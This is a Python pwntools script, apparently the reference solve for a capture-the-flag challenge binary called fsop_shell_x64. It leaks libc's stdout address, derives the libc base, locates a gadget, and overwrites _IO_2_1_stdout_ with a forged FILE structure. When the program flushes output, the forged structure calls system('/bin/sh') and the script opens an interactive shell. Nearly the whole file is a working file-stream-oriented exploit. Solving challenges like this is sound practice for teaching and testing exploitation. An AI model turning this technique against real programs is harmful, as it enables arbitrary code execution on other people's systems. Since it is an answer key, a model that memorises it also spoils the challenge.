#!/usr/bin/env python3
"""Reference solve for tests/challenges/fsop_shell_x64 (byor / nobodyisnobody-style).

libc.address = leak(stdout) - libc.sym['_IO_2_1_stdout_']
edit(0) overwrites libc _IO_2_1_stdout_; flush calls fflush(stdout).
"""

from __future__ import annotations

import os

from pwn import *

context.arch = "amd64"
context.log_level = "info"

_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
_BIN = os.path.join(_ROOT, "tests/challenges/fsop_shell_x64")
_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

ELF(_BIN, checksec=False)
libc = ELF(_LIBC, checksec=False)
p = process(_BIN)

p.recvuntil(b"notes[0]  @ ")
p.recvline()
p.recvuntil(b"stdout    @ ")
stdout_leak = int(p.recvline().strip(), 16)
p.recvuntil(b"notes     @ ")
p.recvline()
p.recvuntil(b"> ")

libc.address = stdout_leak - libc.sym["_IO_2_1_stdout_"]
stdout = libc.sym["_IO_2_1_stdout_"]
info("libc base @ %#x" % libc.address)

fake_vtable = libc.sym["_IO_wfile_jumps"] - 0x18
stdout_lock = libc.sym["_IO_2_1_stdout_"] + 0x88

needle = b"\x48\x83\xc7\x10\xff\xe1"
off = open(_LIBC, "rb").read().find(needle)
assert off != -1, "gadget not found"
gadget = libc.address + off

fake = FileStructure(0)
fake.flags = 0x3B01010101010101
fake._IO_read_end = libc.sym["system"]
fake._IO_save_base = gadget
fake._IO_write_end = u64(b"/bin/sh\x00".ljust(8, b"\x00"))
fake.fileno = 1
fake._lock = stdout_lock
fake._codecvt = stdout + 0xB8
fake.unknown2 = (p64(0) * 2 + p64(stdout + 0x20) + p64(0) * 3).ljust(48, b"\x00")[:48]
fake.vtable = fake_vtable

payload = bytes(fake)[:0x100]

p.sendline(b"3")
p.sendlineafter(b"index: ", b"0")
p.send(payload.ljust(0x100, b"\x00"))
p.recvuntil(b"> ")

p.sendline(b"5")
p.interactive()
